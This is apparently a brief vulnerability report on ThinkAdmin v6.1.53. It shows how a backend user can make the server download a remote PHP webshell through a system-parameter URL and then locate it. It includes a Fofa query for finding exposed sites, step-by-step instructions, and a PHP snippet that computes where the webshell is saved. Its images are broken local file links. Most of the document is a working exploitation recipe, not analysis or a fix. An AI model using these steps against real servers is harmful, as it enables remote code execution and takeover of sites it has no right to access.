ThinkAdmin Logical defect getshell



Project Introduction

ThinkAdmin is a product that follows [MIT]（ https://mit-license.org/ ）Protocol open source rapid development framework, based on the latest version of  ThinkPHP6 , a minimalist backend management system (compatible with ThinkPHP8)

Official website: https://thinkadmin.top/



Audit version: ThinkAdmin Version v6.1.53

![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml7448\wps1.jpg) 

 

Fofa : body="/admin/api.plugs/script"

![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml7448\wps2.jpg) 

Logical defect getshell
Recurrence of vulnerabilities
Log in to the backend to set system parameters

![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml7448\wps18.jpg) 

Fill in the URL of a pure static downloadable PHP webshell file here
That is, the webshell download path
Click to save the configuration
After saving, calculate the path to download to the server
The script is as follows

`function name(string $url, string $ext = '', string $pre = '', string $fun = 'md5'): string

{

  [$hah, $ext] = [$fun($url), trim($ext ?: pathinfo($url, 4), '.\\/')];

  $attr = [trim($pre, '.\\/'), substr($hah, 0, 2), substr($hah, 2, 30)];

  return trim(join('/', $attr), '/') . '.' . strtolower($ext ?: 'tmp');

}

 

$url = "webshell path";

 

echo '/upload/'.name($url, '', 'down/');`



 

![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml7448\wps20.jpg) 

Use the above calculation to calculate the URL variable as the URL for setting system parameters
Splicing paths is sufficient

![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml7448\wps21.jpg) 